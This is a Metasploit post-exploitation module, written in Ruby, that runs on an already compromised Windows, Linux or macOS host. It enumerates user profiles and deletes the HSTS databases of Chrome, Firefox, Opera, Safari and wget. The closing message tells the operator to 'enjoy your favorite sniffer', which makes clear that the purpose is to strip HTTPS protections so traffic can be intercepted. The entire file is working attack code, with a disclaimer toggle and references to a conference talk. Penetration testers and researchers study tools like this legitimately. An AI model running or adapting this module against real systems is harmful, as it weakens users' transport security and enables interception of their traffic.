##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::OSX::System
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Web browsers HSTS entries eraser',
      'Description' => %q{
        This module removes the HSTS database of the following tools and web browsers: Mozilla Firefox,
        Google Chrome, Opera, Safari and wget.
      },
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'Sheila A. Berta (UnaPibaGeek)', # ElevenPaths
        ],
      'Platform'     => %w(linux osx unix win),
      'Arch'         => [ARCH_X86,ARCH_X64],
      'References'   =>
        [
          [ 'URL', 'http://blog.en.elevenpaths.com/2017/12/breaking-out-hsts-and-hpkp-on-firefox.html' ],
          [ 'URL', 'https://www.blackhat.com/docs/eu-17/materials/eu-17-Berta-Breaking-Out-HSTS-And-HPKP-On-Firefox-IE-Edge-And-Possibly-Chrome.pdf' ]
        ],
      'SessionTypes' => %w(meterpreter shell)
    ))

    register_options([
        OptBool.new('DISCLAIMER',
            [true, 'This module will delete HSTS data from the target. Set this parameter to True in order to accept this warning.', false])
      ])
  end

  def run
    unless (datastore['DISCLAIMER'] == true)
        print_error("This module will delete HSTS data from all browsers on the target. You must set the DISCLAIMER option to True to acknowledge that you understand this warning.")
        return
    end

    profiles = user_profiles

    profiles.each do |user_profile|
      account = user_profile['UserName']
      browsers_hsts_db_path = {}

      case session.platform
      when 'windows'
        browsers_hsts_db_path = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\TransportSecurity",
          'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles", #Just path for now
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\TransportSecurity"
        }
      when 'unix', 'linux'
        browsers_hsts_db_path = {
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/TransportSecurity",
          'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox", #Just path for now
          'Opera' => "#{user_profile['LocalAppData']}/.config/opera/TransportSecurity",
          'wget' => "#{user_profile['LocalAppData']}/.wget-hsts"
        }
      when 'osx'
        browsers_hsts_db_path = {
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/TransportSecurity",
          'Firefox' => "#{user_profile['LocalAppData']}/Firefox/Profiles", #Just path for now
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/TransportSecurity",
          'Safari' => "#{user_profile['AppData']}/Cookies/HSTS.plist"
        }
      else
        print_error "Platform not recognized: #{session.platform}"
      end

      browsers_hsts_db_path.each_pair do |browser, path|
        if browser == 'Firefox'
          hsts_db_path = []
          if directory?(path)
            files = dir(path)
            files.reject! { |file| %w(. ..).include?(file) }
            files.each do |file_path|
              hsts_db_path.push([path, file_path, 'SiteSecurityServiceState.txt'].join(system_separator)) if file_path.match(/.*\.default/)
            end
          end
          path = hsts_db_path[0]
        end
        if !path.nil? and file?(path)
          print_status "Removing #{browser} HSTS database for #{account}... "
          file_rm(path)
        end
      end
    end

    print_status "HSTS databases removed! Now enjoy your favorite sniffer! ;-)"

  end

  def user_profiles
    user_profiles = []
    case session.platform
    when /unix|linux/
      user_names = dir("/home")
      user_names.reject! { |u| %w(. ..).include?(u) }
      user_names.each do |user_name|
        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}")
      end
    when /osx/
      user_names = session.shell_command("ls /Users").split
      user_names.reject! { |u| u == 'Shared' }
      user_names.each do |user_name|
        user_profiles.push(
          'UserName' => user_name,
          "AppData" => "/Users/#{user_name}/Library",
          "LocalAppData" => "/Users/#{user_name}/Library/Application Support"
        )
      end
    when /windows/
      user_profiles |= grab_user_profiles
    else
      print_error "Error getting user profile data!"
    end
    user_profiles
  end

  def system_separator
    return session.platform == 'windows' ? '\\' : '/'
  end
end
